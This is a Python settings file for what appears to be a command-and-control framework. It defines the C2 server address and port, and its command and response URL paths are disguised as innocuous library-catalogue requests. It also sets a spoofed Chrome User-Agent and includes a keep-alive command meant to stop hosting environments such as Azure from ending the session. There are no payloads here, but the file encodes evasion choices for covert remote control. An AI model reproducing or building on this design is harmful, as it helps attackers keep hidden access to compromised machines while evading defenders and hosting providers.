#!/bin/python3

from enum import Enum
import platform

class HTTPStatusCode(Enum):
    OK = 200
    CREATED = 201
    NO_CONTENT = 204
    BAD_REQUEST = 400
    UNAUTHORIZED = 401
    FORBIDDEN = 403
    NOT_FOUND = 404
    INTERNAL_SERVER_ERROR = 500

PORT = 8900


# Leave blank to bind to all int otherwise specify c2 server IP address
BIND_ADDR = ""

PROXY = None

C2_SERVER = "localhost"
CMD_REQUEST = "/student?isbn="
RESPONSE_PATH = "/library"
CWD_RESPONSE = "/title"
RESPONSE_KEY = "index"

HEADER: dict[str, str] = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

INPUT_TIMEOUT = 225

# Run this cmd automatically to prevent Azure and other hosting env from killing our active session.
if platform.system() == "Windows":
    KEEP_ALIVE_CMD = "time /T" # windows only
else:
    KEEP_ALIVE_CMD = "date +%R" # linux only

DELAY = 3